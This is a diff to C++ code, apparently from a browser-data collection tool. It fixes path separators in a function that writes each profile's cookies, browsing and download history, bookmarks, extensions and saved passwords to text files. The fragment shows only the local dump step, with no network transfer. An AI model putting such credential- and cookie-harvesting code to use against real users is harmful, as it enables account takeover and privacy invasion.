@@ -617,7 +617,7 @@ void WriteAll(std::string browser, std::string profile, std::string cookies, std
 {
     std::string dir = global::defaultPath + browser;
 
-    std::ofstream file(dir+ "cookies" + '_' + profile + ".txt", std::ios::app);
+    std::ofstream file(dir+ "/cookies" + '_' + profile + ".txt", std::ios::app);
     if (file.is_open())
     {
         file << cookies << std::endl;
@@ -625,7 +625,7 @@ void WriteAll(std::string browser, std::string profile, std::string cookies, std
     file.close();
 
 
-    std::ofstream file1(dir + "history" + '_' + profile + ".txt", std::ios::app);
+    std::ofstream file1(dir + "/history" + '_' + profile + ".txt", std::ios::app);
     if (file1.is_open())
     {
         file1 << history << std::endl;
@@ -633,21 +633,21 @@ void WriteAll(std::string browser, std::string profile, std::string cookies, std
     file1.close();
 
 
-    std::ofstream file2(dir + "downhistory" + '_' + profile + ".txt", std::ios::app);
+    std::ofstream file2(dir + "/downhistory" + '_' + profile + ".txt", std::ios::app);
     if (file2.is_open())
     {
         file2 << downhistory << std::endl;
     }
     file2.close();
 
-    std::ofstream file3(dir + "bookmarks" + '_' + profile + ".txt", std::ios::app);
+    std::ofstream file3(dir + "/bookmarks" + '_' + profile + ".txt", std::ios::app);
     if (file3.is_open())
     {
         file3 << bookmarks << std::endl;
     }
     file3.close();
 
-    std::ofstream file35(dir + "extensions" + '_' + profile + ".txt", std::ios::app);
+    std::ofstream file35(dir + "/extensions" + '_' + profile + ".txt", std::ios::app);
     if (file35.is_open())
     {
         for (ExtensionInfo element : extensions)
@@ -664,14 +664,14 @@ void WriteAll(std::string browser, std::string profile, std::string cookies, std
     }
     file35.close();
 
-    std::ofstream file4(dir + "misc" + '_' + profile + ".txt", std::ios::app);
+    std::ofstream file4(dir + "/misc" + '_' + profile + ".txt", std::ios::app);
     if (file4.is_open())
     {
         file4 << misc << std::endl;
     }
     file4.close();
 
-    std::ofstream file5(dir + "pwds" + '_' + profile + ".txt", std::ios::app);
+    std::ofstream file5(dir + "/pwds" + '_' + profile + ".txt", std::ios::app);
     if (file5.is_open())
     {
         file5 << pwds << std::endl;
